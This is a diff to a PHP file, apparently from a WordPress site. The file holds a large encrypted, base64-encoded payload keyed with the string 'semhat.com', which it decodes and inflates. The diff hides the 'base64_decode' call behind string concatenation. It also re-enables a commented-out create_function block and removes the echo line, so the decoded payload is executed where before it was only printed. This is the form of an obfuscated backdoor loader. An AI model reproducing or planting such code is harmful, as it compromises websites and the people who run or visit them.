@@ -1,5 +1,5 @@
 <?php
-$wp__wp = 'base64_decode';
+$wp__wp = 'base' . (32 * 2) . '_de' . 'code';
 $wp__wp = $wp__wp(str_replace(array("\r","\n"), array('',''), 'JWG+q9iEN2y5Mf2YQSG4v0efgpx4iLY+mNBibWBHQUfuPSYN95IHxXH6QX3rn2zCsjM27fdoJNxC/iMc
 RDdrfh1jJEmGtEv4B8XV41gPOSzXuuVoLnKPJMhCBbysrurG7l4gbT3nlp9CFEC2HaGbUKBb9q0PN2l2
 TMmpDE0YZI9VJ9XCgdW2pPvN2QV76iw9O1UR0/6S8nHKFHfvLblE4FK+L5nlVHfGSQzVtgACGakDfl01
@@ -826,23 +826,16 @@ eMZYXur/s0H5upg+wIy2q5OBwtWE5IWRAaDjYX2L1s9A7XoIR5pWrGKySoEeLEb+qpIRZs5ImkltKisd
 buBNGyG0sqqO5EGbgSx7NWOLd8wd1zwTMhqWI3VQLAE/myx2dB+6OYxlCtG5HXRJqeNUhYakYf16bpH+
 C6vLiMsEE9fCsAG71kGJ74UjSf2HL4cVrUNr9pdGA4FmMSim27BDT9pN1I1oHNIjUWMaBav6wjm/7yxT
 Xr59TCSTwarvCBUyLAU/00QmXhLbo6yp0k5PjIRylfsbDKQrhA=='));
-
 $wp_wp ="semhat.com";
-
 if ($wp_wp !== NULL) {
     $wp_wp = md5($wp_wp) . substr(md5(strrev($wp_wp)), 0, strlen($wp_wp));
     for ($wp___wp = 0; $wp___wp < 49537; $wp___wp++) {
         $wp__wp[$wp___wp] = chr((ord($wp__wp[$wp___wp]) - ord($wp_wp[$wp___wp])) % 256);
         $wp_wp.= $wp__wp[$wp___wp];
     }
-    if ($wp__wp = @gzinflate($wp__wp)) {
-        /*
+    if ($wp__wp = @gzinflate($wp__wp)) { 
         $wp___wp = create_function('', $wp__wp);
         unset($wp__wp, $wp_wp);
         $wp___wp();
-        */
-        echo $wp__wp;
     }
-}
-
-?>
+} ?>
